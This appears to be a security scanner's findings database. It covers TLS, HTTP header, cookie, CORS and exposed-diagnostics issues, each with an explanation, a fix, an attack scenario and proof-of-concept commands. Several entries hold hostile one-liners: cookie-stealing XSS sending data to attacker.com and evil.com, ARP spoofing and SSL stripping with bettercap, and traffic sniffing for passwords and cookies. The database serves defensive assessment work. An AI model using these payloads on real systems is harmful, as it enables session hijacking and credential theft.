analysis:
An X.509 TLS certificate carries a hard-coded validity window (notBefore / notAfter).  Once the expiry date passes the certificate is cryptographically invalid.  Every major browser and TLS client enforces this and will refuse the connection by default, displaying a prominent security warning to users.

Why it is a security problem:
  • Browsers block access entirely, treating the site as unsafe.  Legitimate users cannot reach the service without clicking through a frightening warning.
  • An expired certificate may be a sign of a broken certificate-management process, which could leave the site running on an unrotated credential for months — creating a window for a man-in-the-middle (MITM) attacker to substitute a fraudulent certificate without anyone noticing.
  • Certificate Transparency (CT) logs are public; an expired cert with no renewal signals to attackers that the organisation has poor security hygiene, inviting further probing.

Real-world impact:
  Visitors see browser errors and abandon the site.  Automated clients (APIs, mobile apps, IoT devices) fail silently or loudly.  Search engine crawlers may de-index the site.  In regulated industries an expired cert can trigger a compliance violation (PCI-DSS, HIPAA, SOC 2).
remediation:
Immediate actions:
  1. Renew the certificate immediately through your CA (Let's Encrypt, DigiCert, Sectigo, etc.).
  2. Install the new certificate and private key on the web server / load balancer.
  3. Reload the web server (nginx -s reload, systemctl reload apache2, etc.) — no hard restart is needed in most cases.
  4. Verify with: openssl s_client -connect <host>:443 2>/dev/null | openssl x509 -noout -dates

Automation (strongly recommended):
  • Use Let's Encrypt + Certbot with a cron job or systemd timer for automatic renewal (certbot renew).
  • For AWS, use AWS Certificate Manager (ACM) which auto-renews.
  • For Kubernetes, use cert-manager with an ACME issuer.

Prevention:
  • Set monitoring alerts at 30 days and 7 days before expiry.
  • Add the certificate fingerprint / expiry to your asset inventory.
  • Consider Certificate Authority Authorisation (CAA) DNS records to prevent unauthorised issuance.
attack_scenario: An attacker monitoring Certificate Transparency logs spots that your certificate has expired. They set up a rogue access point (e.g., at a coffee shop), intercept HTTP traffic from users who ignored the browser warning, and present a fraudulent certificate. Because users have been trained to click past certificate errors, many proceed — handing the attacker their credentials in cleartext.
poc_command:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -dates
# expired certificate output: notAfter=Jan  1 00:00:00 2024 GMT

analysis:
The TLS certificate will expire within 30 days.  While it is still valid today, the narrow window means that any delay in renewal could cause service disruption.

Why it is a security problem:
  • If renewal is not completed before expiry, all visitors and automated clients will receive a certificate error and be blocked from the site.
  • Rushed last-minute renewals under pressure introduce operational risk (deploying during off-hours, skipping change-management procedures).
  • Short-validity windows indicate the organisation may not have automated certificate lifecycle management in place — a wider process gap.
remediation:
Immediate actions:
  1. Renew the certificate now, before expiry, to maintain continuity.
  2. If using Let's Encrypt / Certbot, run: certbot renew --force-renewal
  3. After renewal, reload the server: systemctl reload nginx

Verification:
  openssl s_client -connect <host>:443 2>/dev/null | openssl x509 -noout -dates

Long-term hardening:
  • Automate renewal using Certbot timers, ACME clients, or a managed CA.
  • Add monitoring alerts at 30 and 7 days before expiry.
attack_scenario: Attacker checks CT logs or runs automated certificate expiry scanners to build a target list. They wait for the certificate to expire then launch SSL stripping or MITM attacks during the window before renewal, knowing the site owner may not notice immediately.
poc_command:
# Automated expiry detection:
curl -s https://crt.sh/?q=target.com&output=json | python3 -c "import json,sys; [print(e['not_after'], e['common_name']) for e in json.load(sys.stdin)]"

analysis:
A self-signed certificate is one where the entity that issued the certificate is the same as the entity named in the certificate.  No third-party Certificate Authority (CA) has verified the identity of the server operator.

Why it is a security problem:
  • Browsers and operating systems ship with a trust store of well-known CAs. Self-signed certificates are not in this store, so every browser will display a 'Your connection is not private' warning.
  • Users who click past the warning have trained themselves to ignore TLS errors — a dangerous habit that makes real MITM attacks easier to execute.
  • Automated clients (REST APIs, mobile apps) typically reject self-signed certs unless explicitly configured to ignore certificate validation, which often means those clients disable ALL certificate checks — defeating TLS entirely.
  • For internal infrastructure, self-signed certs are acceptable only when the CA certificate is explicitly distributed and trusted via MDM/GPO.
remediation:
Production / internet-facing systems:
  1. Obtain a certificate from a trusted CA.
  2. Let's Encrypt provides free, automated, trusted certificates:
       sudo certbot --nginx -d example.com -d www.example.com
  3. Commercial CAs (DigiCert, Sectigo) are required for Extended Validation (EV) certs or for non-HTTP protocols.

Internal / private systems:
  1. Build an internal PKI with a root CA (using step-ca, HashiCorp Vault PKI, or Windows AD CS).
  2. Distribute the internal root CA certificate to all clients via MDM, Group Policy, or configuration management.

Verification:
  openssl s_client -connect <host>:443 -CAfile /etc/ssl/certs/ca-certificates.crt
  Expected: Verify return code: 0 (ok)
attack_scenario: An attacker on the same network (rogue Wi-Fi, ARP spoofing) presents their own self-signed certificate during a MITM attack. Because the target server already uses a self-signed cert, users and automated clients have been configured to ignore certificate validation errors — so the attacker's fraudulent certificate is accepted silently, decrypting the entire session.
poc_command:
# ARP spoof + SSL strip:
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
sslstrip -l 8080
# Then proxy traffic through mitmproxy presenting attacker cert

analysis:
TLS certificates specify exactly which hostnames they are valid for in the Subject Alternative Name (SAN) extension.  When the hostname used to reach the server does not appear in the SAN list, the TLS handshake fails with a certificate name-mismatch error.

Why it is a security problem:
  • Browsers and strict TLS clients reject the connection outright.
  • A certificate valid for a different hostname provides no assurance of server identity for the current target — an attacker could present the same mismatched cert during a MITM attack.
  • This commonly occurs when a certificate is re-used across multiple virtual hosts without being properly extended to cover all hostnames.
remediation:
1. Identify all hostnames that need to be covered (e.g., example.com, www.example.com, api.example.com).
  2. Reissue the certificate with all required names in the SAN field.
     Let's Encrypt: certbot certonly --standalone -d example.com -d www.example.com
  3. Install the new cert and reload the server.
  4. Verify with: openssl s_client -connect <host>:443 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'

Wildcard certs (*.example.com) cover all single-level subdomains and may reduce the management overhead, but require DNS-01 ACME challenges rather than HTTP-01.
attack_scenario: Attacker exploits the fact that clients either already ignore hostname validation (because the mismatched cert has trained them to) or that the server's cert is re-used across virtual hosts. A MITM attacker presents the legitimate mismatched cert for a different hostname and many clients accept it, as the error matches the familiar 'expected' warning.
poc_command:
openssl s_client -connect target.com:443 2>&1 | grep -E 'subject|CN|SAN|error'
# Shows: error 62 (hostname mismatch)

analysis:
TLS (Transport Layer Security) is the protocol that encrypts traffic between browsers and servers.  SSLv2, SSLv3, TLSv1.0, and TLSv1.1 are all formally deprecated by RFC 8996 (March 2021) because they contain unfixable cryptographic design flaws.

Why it is a security problem:
  • POODLE (CVE-2014-3566): An attacker with a network vantage point can force a TLS 1.0/SSLv3 downgrade and exploit CBC padding oracles to decrypt session cookies, hijacking authenticated sessions.
  • BEAST (CVE-2011-3389): A TLS 1.0 IV-chaining vulnerability allows chosen plaintext attacks against cookies and session tokens.
  • DROWN (CVE-2016-0800): SSLv2 support on any server that shares a private key allows decryption of TLS 1.x traffic intercepted years earlier.
  • SWEET32 (CVE-2016-2183): 64-bit block ciphers (3DES) used in TLS 1.0/1.1 are vulnerable to birthday attacks over long-lived connections.

Compliance implications:
  PCI-DSS 3.2+ explicitly requires TLS 1.2 as the minimum.  Many healthcare and government frameworks impose the same requirement.
remediation:
Step 1 — Identify your TLS termination point:
  This is usually nginx, Apache, HAProxy, AWS ALB, Cloudflare, or IIS.

Step 2 — Update the TLS protocol configuration:
  nginx:  ssl_protocols TLSv1.2 TLSv1.3;
  Apache: SSLProtocol -all +TLSv1.2 +TLSv1.3
  HAProxy: ssl-min-ver TLSv1.2
  IIS:    Disable via Schannel registry keys or IIS Crypto tool

Step 3 — Also update cipher suites to modern equivalents:
  nginx:  ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';

Step 4 — Reload the server:
  nginx -s reload  |  systemctl reload apache2  |  haproxy -f /etc/haproxy -D

Step 5 — Verify:
  openssl s_client -tls1_1 -connect <host>:443  → expect handshake failure
  openssl s_client -tls1_2 -connect <host>:443  → expect success
  Use testssl.sh or https://www.ssllabs.com/ssltest/ for a full report.

Reference: Mozilla SSL Configuration Generator at ssl-config.mozilla.org provides up-to-date recommended configurations.
attack_scenario: Attacker uses a tool like bettercap to perform a TLS downgrade attack. They sit between client and server (via ARP poisoning on a LAN, or BGP hijack at ISP level) and negotiate TLS 1.0 with both parties. They then exploit the POODLE vulnerability's CBC padding oracle to decrypt the session cookie byte-by-byte — typically taking ~256 requests per byte — then inject that cookie to hijack the authenticated session.
poc_command:
# Detect with testssl.sh:
testssl.sh --protocols target.com
# Active downgrade (authorized testing only):
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.5; arp.spoof on; set ssl.strip.strip true; ssl.strip on"

analysis:
Cipher suites define the specific cryptographic algorithms used during a TLS session: key exchange, authentication, bulk encryption, and message authentication. RC4, DES, 3DES, EXPORT-grade ciphers, NULL ciphers, and anonymous (anon) key exchange are all considered cryptographically broken.

Why it is a security problem:
  • RC4: Statistical biases in the keystream allow plaintext recovery of TLS-encrypted session tokens (NOMORE attack, RFC 7465 prohibits RC4 in TLS).
  • DES / 3DES: 56-bit effective key length for DES is trivially brute-forced. 3DES's 64-bit block size is vulnerable to the SWEET32 birthday attack after ~32 GB of traffic on the same session key.
  • EXPORT ciphers: Deliberately weakened to 40/56-bit keys for 1990s US export law; trivially broken.  Used in FREAK (CVE-2015-0204) and Logjam attacks.
  • NULL ciphers: No encryption at all — traffic is transmitted in cleartext while appearing to use TLS.
  • Anonymous (anon) key exchange: No server authentication; a MITM attacker can impersonate any server trivially.
remediation:
1. Replace your cipher suite list with a modern, secure set.

  Recommended for nginx (TLS 1.2 + 1.3):
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
    ssl_prefer_server_ciphers on;

  Recommended for Apache:
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
    SSLHonorCipherOrder on

  2. Reload the server after changes.
  3. Verify with: openssl s_client -cipher RC4-SHA -connect <host>:443 → expect handshake failure
  4. Use testssl.sh --cipher-per-proto for a comprehensive cipher audit.
attack_scenario: Attacker records encrypted TLS sessions between the target and its users over an extended period (passive capture). Once enough traffic is collected (32 GB+ for SWEET32 against 3DES), birthday attack statistics allow the attacker to recover plaintext session tokens from the recorded traffic. Alternatively, RC4 keystream biases allow targeted recovery of specific byte positions like session cookie values after ~2^26 encryptions.
poc_command:
# Force weak cipher negotiation (testssl.sh):
testssl.sh --cipher-per-proto target.com
# Verify RC4 rejection:
openssl s_client -cipher RC4-SHA -connect target.com:443
# Expected if vulnerable: handshake succeeds

analysis:
The scanner could not complete a TLS handshake with port 443.  This means HTTPS is either not available, misconfigured, or the port is not reachable.

Why it is a security problem:
  • If the service is running on HTTP only, all traffic — including authentication credentials and session tokens — is transmitted in cleartext and is trivially interceptable by anyone on the network path.
  • A misconfigured TLS stack may silently fall back to unencrypted HTTP, exposing users without any warning.
remediation:
1. Confirm whether the service intends to serve HTTPS.
  2. If HTTPS is intended, check firewall rules to ensure port 443 is open.
  3. Verify the TLS configuration in your web server.
  4. Check for certificate errors preventing the handshake:
       openssl s_client -connect <host>:443
  5. If only HTTP is used, immediately plan migration to HTTPS with a valid TLS certificate.  Use Let's Encrypt for a free, trusted certificate.
attack_scenario: Attacker identifies the service is running on plain HTTP only. They set up a packet sniffer on the network path (or compromise a router) and passively capture all HTTP traffic. Every request — login forms, session cookies, API tokens — arrives in cleartext with no active effort required.
poc_command:
# Verify HTTP-only service:
curl -v http://target.com/ 2>&1 | grep -E 'HTTP|Location|Set-Cookie'
# Passive capture:
tcpdump -i eth0 -A 'host target.com and port 80' | grep -E 'Cookie|Password|token'

analysis:
HTTP Strict Transport Security (HSTS) is a web security policy mechanism that instructs browsers to only ever connect to the server over HTTPS, refusing any HTTP connections for the specified max-age duration.

Why it is a security problem:
  • Without HSTS, a user who types 'example.com' in their browser first makes an unencrypted HTTP request, which can be intercepted.  An attacker on the network (coffee-shop Wi-Fi, rogue access point, ISP-level MITM) can intercept this initial request and respond with a fake page that never upgrades to HTTPS — a classic SSL stripping attack (sslstrip).
  • Even if the server sends a 301 redirect from HTTP to HTTPS, the redirect response itself is sent in plaintext and can be modified by an attacker.
  • HSTS eliminates the HTTP-to-HTTPS transition entirely once the header has been seen: the browser refuses to even attempt an HTTP connection.
remediation:
1. Add the header to your HTTPS virtual host configuration.

  nginx:
    add_header Strict-Transport-Security 'max-age=63072000; includeSubDomains; preload' always;

  Apache:
    Header always set Strict-Transport-Security 'max-age=63072000; includeSubDomains; preload'

  Node.js / Express (helmet):
    app.use(helmet.hsts({ maxAge: 63072000, includeSubDomains: true }))

  2. Start with a shorter max-age (e.g., 300 seconds) to test, then increase to 63072000 (2 years) once you are confident all subdomains support HTTPS.
  3. Optionally submit your domain to the HSTS preload list at hstspreload.org — this bakes HSTS into browsers themselves, protecting first-time visitors.
  4. Verify:
     curl -I https://<host>/ | grep -i strict
attack_scenario: Attacker sets up sslstrip (or bettercap's ssl.strip module) on a shared network. When a user navigates to 'target.com' (without HTTPS), their browser first makes an HTTP request. The attacker intercepts this HTTP request before it can redirect to HTTPS, serving the user a forged HTTP page. The user logs in via HTTP, sending credentials in cleartext. The attacker forwards the request to the real HTTPS site, so the login succeeds — the user sees nothing wrong.
poc_command:
# SSL stripping attack (authorized lab only):
bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.5; arp.spoof on; set http.proxy.sslstrip true; http.proxy on"
# Verify HSTS header:
curl -sI https://target.com | grep -i strict

analysis:
Content Security Policy (CSP) is an HTTP response header that tells browsers which sources of content (scripts, styles, images, frames, etc.) are considered legitimate.  Browsers block any resource loaded from an unlisted source.

Why it is a security problem:
  • Without CSP, a Cross-Site Scripting (XSS) vulnerability anywhere on the page gives an attacker full control: they can execute arbitrary JavaScript, steal cookies and localStorage, capture keystrokes, redirect users, and make authenticated API calls on behalf of the user.
  • CSP is the primary browser-side defence against XSS.  Even if the application has an XSS flaw, a well-configured CSP prevents the injected script from loading or running.
  • CSP also mitigates clickjacking (frame-ancestors directive), mixed content, and data exfiltration (connect-src directive).

Severity context:
  XSS is consistently ranked in the OWASP Top 10 and was responsible for high-profile breaches including the British Airways breach (2018, ~500k customers' payment data stolen via injected JS).
remediation:
1. Start with a report-only policy to understand what would be blocked without breaking the site:

     Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

  2. Analyse the CSP violation reports to identify all legitimate sources.
  3. Build a restrictive policy, then switch to Content-Security-Policy.

  Recommended starting policy:
    Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}'; style-src 'self' 'nonce-{RANDOM}'; img-src 'self' data: https:; font-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; upgrade-insecure-requests;

  Key directives explained:
    script-src 'nonce-...' — require a per-page random nonce on inline scripts
    object-src 'none'      — disable Flash / Java plugins
    base-uri 'self'        — prevent base-tag injection attacks
    frame-ancestors 'none' — replace X-Frame-Options

  Tooling:
    • CSP Evaluator: csp-evaluator.withgoogle.com
    • Mozilla Observatory: observatory.mozilla.org
    • Helmet (Node.js): helmet.contentSecurityPolicy()
attack_scenario: Attacker finds an XSS vulnerability in a comment field or URL parameter. Without CSP, they inject a <script src='https://evil.com/steal.js'></script> tag that: (1) reads document.cookie to steal the session token, (2) sends it via fetch() to the attacker's server, (3) optionally installs a persistent keylogger. The attacker's server logs the stolen cookie; they replay it to hijack the victim's account — all without knowing the victim's password.
poc_command:
# Test for XSS without CSP:
curl -s 'https://target.com/search?q=<script>alert(1)</script>' | grep '<script>'
# CSP evaluation:
curl -sI https://target.com | grep -i content-security
# Use csp-evaluator.withgoogle.com for policy analysis

analysis:
The X-Content-Type-Options: nosniff header instructs browsers not to guess ('sniff') the MIME type of a response, instead trusting only the declared Content-Type.

Why it is a security problem:
  • Historically, browsers would try to infer the content type from the response body if the server's Content-Type was wrong or absent.  An attacker who can upload files (e.g., a profile picture) could upload a file containing JavaScript but disguised as an image.  Without nosniff, older browsers would detect the JS and execute it, achieving XSS.
  • Modern Chromium-based browsers enforce MIME type matching for scripts and workers, but this header remains a defence-in-depth control required by OWASP, PCI-DSS, and government security standards.
remediation:
One-line fix — add to your web server virtual host:

  nginx:  add_header X-Content-Type-Options 'nosniff' always;
  Apache: Header always set X-Content-Type-Options 'nosniff'
  IIS:    Via HTTP Response Headers in IIS Manager, or:
          <customHeaders><add name='X-Content-Type-Options' value='nosniff'/></customHeaders>

  Verify: curl -I https://<host>/ | grep -i x-content-type
attack_scenario: Attacker uploads a file to an avatar or attachment upload endpoint with a .jpg extension but containing JavaScript. Without X-Content-Type-Options: nosniff, the browser detects the JS content via MIME sniffing and executes it as a script, triggering XSS from the upload endpoint. This is a classic stored XSS via MIME confusion.
poc_command:
# Create polyglot file (image + JS):
printf 'GIF89a/*<script>alert(document.cookie)</script>*/=alert(1)//' > polyglot.gif
# Upload and navigate to the served file URL to test execution

analysis:
X-Frame-Options controls whether the browser is permitted to render the page inside a <frame>, <iframe>, <embed>, or <object>.

Why it is a security problem:
  • Without this header, attackers can embed the target site in a transparent iframe overlaid on a malicious page.  Users believe they are interacting with the malicious page but are actually clicking on the invisible, underlying target site — a technique called clickjacking.
  • Clickjacking can be used to trick users into: changing account settings, initiating financial transactions, approving OAuth permissions, enabling camera or microphone access, or 'liking' social media posts.
  • The Paypal clickjacking attack (2008) and the Twitter clickjacking worm (2009) are well-known historical examples.
remediation:
nginx:  add_header X-Frame-Options 'DENY' always;
  Apache: Header always set X-Frame-Options 'DENY'

  Options:
    DENY       — never allow framing (recommended for most apps)
    SAMEORIGIN — allow framing only by pages from the same origin

  Modern alternative:
    Use CSP frame-ancestors directive instead, which is more flexible:
    Content-Security-Policy: frame-ancestors 'none';

  Verify: curl -I https://<host>/ | grep -i x-frame
attack_scenario: Attacker creates a malicious web page that iframes the target site (e.g., target.com/settings/delete-account) in a transparent overlay. The victim visits the attacker's page, sees what appears to be a harmless button (e.g., 'Click to win a prize'), but is actually clicking the hidden 'Confirm Delete' button on the target site. Their browser sends the authenticated request because the iframe carries the victim's cookies.
poc_command:
<!-- Clickjacking PoC (save as poc.html and serve locally): -->
<html><body>
<iframe src='https://target.com/account/delete' style='opacity:0;position:absolute;top:0;left:0;width:100%;height:100%'></iframe>
<button style='position:absolute;top:100px;left:50px'>Click me to win!</button>
</body></html>

analysis:
The Referrer-Policy header controls how much referrer information is included in the HTTP Referer header when navigating away from the page.

Why it is a security problem:
  • Without a restrictive policy, the full URL of the page — including path, query parameters, and fragments — is sent to third-party servers as the Referer header.  This can leak sensitive information such as:
    - Password reset tokens in URLs (e.g., /reset?token=abc123)
    - Search queries
    - Session identifiers embedded in URLs
    - Internal application path structures
  • This data appears in third-party analytics, ad networks, CDN access logs, and external API request logs — all outside your control.
remediation:
nginx:  add_header Referrer-Policy 'strict-origin-when-cross-origin' always;
  Apache: Header always set Referrer-Policy 'strict-origin-when-cross-origin'

  Policy options (from most to least restrictive):
    no-referrer                    — never send Referer
    strict-origin-when-cross-origin — send full URL same-origin, only origin cross-origin (recommended)
    same-origin                    — only send within same origin
    no-referrer-when-downgrade     — never send over HTTP (default browser)

  Avoid: 'unsafe-url' (always sends full URL including sensitive params).
attack_scenario: A user receives a password reset email and clicks the link: https://target.com/reset?token=abc123xyz. The reset page loads third-party analytics (Google Analytics, Hotjar). Without a restrictive Referrer-Policy, the browser sends the full URL (including the reset token) as the Referer header to each third-party. An attacker who compromises or controls one of those analytics providers can extract the reset token from their access logs and reset the victim's password.
poc_command:
# Observe Referer leakage:
curl -sI -e 'https://target.com/reset?token=SECRET123' https://analytics.example.com/ | grep -i referer
# Or check network tab in browser DevTools when analytics fire

analysis:
Permissions-Policy (formerly Feature-Policy) controls which browser APIs and hardware features the page and its embedded frames are permitted to access.

Why it is a security problem:
  • Without restrictions, any script running on the page (including injected third-party scripts or XSS payloads) can request access to:
    - Camera and microphone (covert surveillance)
    - Geolocation (precise location tracking)
    - Payment APIs (financial fraud)
    - USB / Bluetooth devices
  • Third-party iframes (ads, widgets) may also silently request these permissions unless explicitly restricted.
remediation:
Add a restrictive Permissions-Policy header, disabling features your application does not use:

  nginx:
    add_header Permissions-Policy 'camera=(), microphone=(), geolocation=(), payment=(), usb=()' always;

  Apache:
    Header always set Permissions-Policy 'camera=(), microphone=(), geolocation=(), payment=(), usb=()'

  Only list origins in the policy for features your app legitimately uses.
  Reference: developer.mozilla.org/en-US/docs/Web/HTTP/Permissions_Policy
attack_scenario: A malicious ad or third-party widget embedded on the page (via XSS, supply chain compromise, or a rogue ad network) requests camera access using navigator.mediaDevices.getUserMedia(). Without a Permissions-Policy restricting camera access, the browser may grant it to the embedded frame, enabling covert video recording or screen capture from the victim's device.
poc_command:
# Test permissions policy:
curl -sI https://target.com | grep -i permissions-policy
# In browser console:
navigator.mediaDevices.getUserMedia({video: true}).then(s => console.log('camera granted')).catch(e => console.log('blocked:', e))

analysis:
The server is returning response headers (such as Server, X-Powered-By, X-AspNet-Version) that expose information about the underlying technology stack and its version number.

Why it is a security problem:
  • Version disclosure directly enables targeted attacks.  An attacker who knows the server runs 'Apache/2.4.49' can look up known CVEs for that exact version and deploy exploits without any guessing.
  • In the Apache 2.4.49 example, this exact information would have allowed attackers to immediately target CVE-2021-41773 (path traversal / RCE), one of the most rapidly exploited CVEs in history.
  • Version information aids attackers in:
    - Selecting appropriate exploit payloads
    - Identifying end-of-life software
    - Targeting unpatched dependencies
    - Fingerprinting infrastructure for supply-chain attacks
remediation:
Remove or genericise technology-disclosing headers.

  nginx — suppress server header:
    server_tokens off;  (in http {} block)
    # For full suppression: compile with nginx_headers_more module
    more_clear_headers Server;

  Apache:
    ServerTokens Prod
    ServerSignature Off
    Header unset X-Powered-By
    Header always unset X-Powered-By

  PHP — suppress version header:
    In php.ini: expose_php = Off

  Node.js / Express:
    app.disable('x-powered-by')
    # or with helmet: app.use(helmet())

  Verify: curl -I https://<host>/ | grep -i 'server\|x-powered'
attack_scenario: Attacker sends a single HTTP request and reads the Server header. They look up 'Apache 2.4.49 CVE' and immediately find CVE-2021-41773 — a path traversal / RCE vulnerability exploitable with a single curl command. No guessing, no brute force — version disclosure cut their reconnaissance to zero seconds.
poc_command:
# Fingerprint server version:
curl -sI https://target.com | grep -Ei 'server|x-powered-by|x-aspnet'
# Then search ExploitDB for the disclosed version:
searchsploit 'Apache 2.4.49'

analysis:
Session cookies without the Secure flag can be transmitted over unencrypted HTTP connections.  Cookies without the HttpOnly flag are accessible to JavaScript running on the page.

Why it is a security problem:
  • Missing Secure flag: If a user visits the site over HTTP (e.g., after following a non-HTTPS link, or before HSTS takes effect), the browser will send the session cookie in cleartext.  An attacker on the same network can intercept and steal the cookie, hijacking the authenticated session.
  • Missing HttpOnly flag: If the application has an XSS vulnerability (or loads a compromised third-party script), JavaScript can read the cookie via document.cookie and exfiltrate it to an attacker-controlled server, achieving persistent session hijacking.

Impact: Session hijacking allows complete account takeover without knowing the user's password.
remediation:
Always set both flags on every authentication and session cookie.

  Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict; Path=/

  Framework-specific:
  Django:   SESSION_COOKIE_SECURE = True, SESSION_COOKIE_HTTPONLY = True
  Rails:    config.session_store :cookie_store, secure: true, httponly: true
  Express:  app.use(session({ cookie: { secure: true, httpOnly: true } }))
  PHP:      session.cookie_secure = 1, session.cookie_httponly = 1 (php.ini)
  ASP.NET:  <httpCookies requireSSL='true' httpOnlyCookies='true' />

  Also add SameSite=Strict (or Lax) to prevent CSRF attacks.

  Verify: curl -I https://<host>/login | grep Set-Cookie
attack_scenario: A victim connects to the target site over public Wi-Fi. An attacker running Wireshark on the same network captures an HTTP request that includes the session cookie (because the Secure flag is absent). They copy the cookie value into their browser's DevTools and are instantly logged in as the victim. If only HttpOnly is missing: attacker injects a small XSS payload `fetch('https://evil.com?c='+document.cookie)` and exfiltrates the cookie remotely.
poc_command:
# Steal cookie via XSS (HttpOnly missing):
<script>fetch('https://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>
# Network capture (Secure flag missing):
tcpdump -i eth0 -A 'host target.com' | grep Cookie

analysis:
The server does not redirect HTTP requests to HTTPS.  Users who access the site via http:// receive content over an unencrypted connection.

Why it is a security problem:
  • All data transmitted over HTTP — including form submissions, login credentials, and session cookies — is sent in cleartext and can be read or modified by anyone with access to the network path.
  • This enables credential theft, session hijacking, and content injection (injecting ads, malware, or fake login forms into the page).
  • Many users type domain names without specifying a scheme; browsers default to HTTP, making this a common real-world exposure.
attack_scenario: Attacker uses bettercap's http.proxy module on a shared network to intercept the user's initial HTTP request to target.com. They modify the response, stripping the redirect to HTTPS and serving the real page over HTTP. All subsequent requests from that tab — including login credentials — travel in cleartext through the attacker's proxy.
poc_command:
# Verify plain HTTP response:
curl -v http://target.com/ 2>&1 | head -20
# If 200 OK (no redirect): HTTP traffic is unencrypted

analysis:
Cross-Origin Resource Sharing (CORS) is the browser mechanism that controls which origins can make cross-site HTTP requests and read the responses. Setting Access-Control-Allow-Origin: * allows ANY website on the internet to make requests to this API and read the responses.

Why it is a security problem:
  • If the API returns sensitive data (user information, tokens, internal data), any malicious website visited by an authenticated user can silently make requests to the API using the user's cookies/credentials and read the full response body.
  • This enables cross-site data theft without any user interaction beyond visiting the attacker's page.
  • The wildcard policy is especially dangerous when combined with credentials (Access-Control-Allow-Credentials: true), though browsers prevent this combination — it signals a misconfiguration in the developer's intent.
attack_scenario: Attacker builds a malicious website (evil.com). When an authenticated victim visits evil.com, the page runs: `fetch('https://target.com/api/user', {credentials: 'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com/log?data='+JSON.stringify(d)))`. The browser sends the victim's session cookies to target.com (because credentials:'include'), and because CORS allows *, it reads and exfiltrates the full API response to the attacker's server.
poc_command:
# Test CORS misconfiguration:
curl -sI -H 'Origin: https://evil.com' https://target.com/api/user | grep -i 'access-control'
# Vulnerable: Access-Control-Allow-Origin: * or Access-Control-Allow-Origin: https://evil.com

analysis:
The server reflected back the attacker-controlled Origin header value in the Access-Control-Allow-Origin response.  This means the server validates origins by reflection rather than against a fixed allowlist — any origin is implicitly trusted.

Why it is a security problem:
  • Functionally equivalent to CORS wildcard, but even more dangerous: the server also allows credentialed requests (cookies are sent), enabling cross-origin data theft with full authentication context.
  • An attacker who controls https://evil.example.com can make requests to this API using the victim's session cookies and read protected data.
remediation:
Validate the Origin header against a hardcoded allowlist — do NOT reflect it:

  Python:
    ALLOWED_ORIGINS = {'https://app.example.com', 'https://admin.example.com'}
    def get_cors_origin(request_origin):
        return request_origin if request_origin in ALLOWED_ORIGINS else None

  Never use: response.headers['Access-Control-Allow-Origin'] = request.headers['Origin']

  Use a well-maintained CORS middleware library and provide an explicit list of allowed origins.
attack_scenario: Same as CORS wildcard but the server also echoes back credentials. Attacker sends `Origin: https://evil.com` in a preflight. Server responds with `Access-Control-Allow-Origin: https://evil.com` and `Access-Control-Allow-Credentials: true`. Now the attacker's page can make fully credentialed cross-origin requests, reading responses containing the victim's private data.
poc_command:
curl -sI -H 'Origin: https://evil.com' https://target.com/api/me | grep -i 'access-control'
# Vulnerable output:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

analysis:
A phpinfo() page is publicly accessible.  This PHP built-in function outputs a comprehensive dump of the PHP runtime configuration.

Why it is a security problem:
  • phpinfo() reveals: PHP version and compilation flags, all loaded extensions and their versions, full php.ini settings (including paths to sensitive files), environment variables (which may contain secrets), the server software stack, directory paths, and network configuration.
  • This single page provides an attacker with a complete blueprint for targeting known CVEs in the disclosed PHP version, exploiting misconfigured extensions (e.g., disable_functions bypass), and locating config files.
  • In 2021, a phpinfo() disclosure was part of the attack chain in several documented breaches.
remediation:
1. Immediately remove all phpinfo() files from the production server:
       find /var/www -name 'phpinfo.php' -o -name 'info.php' | xargs rm
  2. Ensure your deployment pipeline never promotes phpinfo files to production (add to .gitignore, add a CI check).
  3. In php.ini, disable the function as a defence-in-depth measure:
       disable_functions = phpinfo, exec, shell_exec, system, passthru
  4. Review other diagnostic files: /server-status, /server-info, /elmah.axd
  5. Verify: curl -s https://<host>/phpinfo.php | grep phpinfo → no output
attack_scenario: Attacker fetches /phpinfo.php (or /info.php) and within seconds knows the exact PHP version, all loaded extensions, the full path to config files, and any environment variables (which may include database passwords or API keys). They cross-reference the PHP version against known CVEs and craft a targeted exploit. The disclosure of `open_basedir` paths also shows them exactly which directories to target.
poc_command:
curl -s https://target.com/phpinfo.php | grep -Ei 'PHP Version|SERVER_SOFTWARE|DOCUMENT_ROOT|HTTP_|DB_PASSWORD'
# Or browse directly: https://target.com/info.php

analysis:
ELMAH (Error Logging Modules and Handlers) is an ASP.NET error-logging library.  The /elmah.axd endpoint provides a web UI for browsing all application errors logged by the server.

Why it is a security problem:
  • ELMAH error entries contain full exception stack traces, including internal file paths, class names, connection strings, and sometimes passwords or tokens that appeared in error messages.
  • Attackers can enumerate all recent exceptions to understand the application's internal structure, identify vulnerable code paths, and discover database credentials from connection string errors.
remediation:
1. Restrict access to /elmah.axd in Web.config:
       <location path='elmah.axd'>
         <system.web>
           <authorization>
             <allow roles='Administrator' />
             <deny users='*' />
           </authorization>
         </system.web>
       </location>
  2. Or restrict by IP in IIS:
       <ipSecurity allowUnlisted='false'>
         <add ipAddress='10.0.0.0' subnetMask='255.255.255.0' allowed='true'/>
       </ipSecurity>
